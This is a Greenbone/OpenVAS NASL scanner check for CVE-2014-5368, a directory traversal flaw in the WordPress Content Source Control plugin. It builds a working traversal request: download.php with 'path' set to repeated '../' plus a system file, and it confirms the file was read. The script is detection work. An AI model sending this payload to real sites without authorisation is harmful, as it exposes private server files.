CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804904" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2014-5368" );
	script_bugtraq_id( 69278 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-09-19 10:28:34 +0530 (Fri, 19 Sep 2014)" );
	script_name( "WordPress Content Source Control Plugin Directory Traversal Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress
  Content Source Control plugin and is prone to directory traversal
  vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET
  request and check whether it is possible to read a local file" );
	script_tag( name: "insight", value: "Input passed via the 'path' parameter
  to download.php script is not properly sanitized before being returned
  to the user" );
	script_tag( name: "impact", value: "Successful exploitation will allow
  attacker to read arbitrary files on the target system." );
	script_tag( name: "affected", value: "WordPress Content Source Control plugin
  version 3.0.0 and earlier." );
	script_tag( name: "solution", value: "Update to version 3.1.0 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://seclists.org/oss-sec/2014/q3/407" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/95374" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "secpod_wordpress_detect_900182.sc", "os_detection.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://wordpress.org/plugins/wp-source-control" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/wp-content/plugins/wp-source-control/downloadfiles/download" + ".php?path=" + crap( data: "../", length: 3 * 15 ) + files[file];
	if(http_vuln_check( port: http_port, url: url, pattern: file )){
		security_message( port: http_port );
		exit( 0 );
	}
}

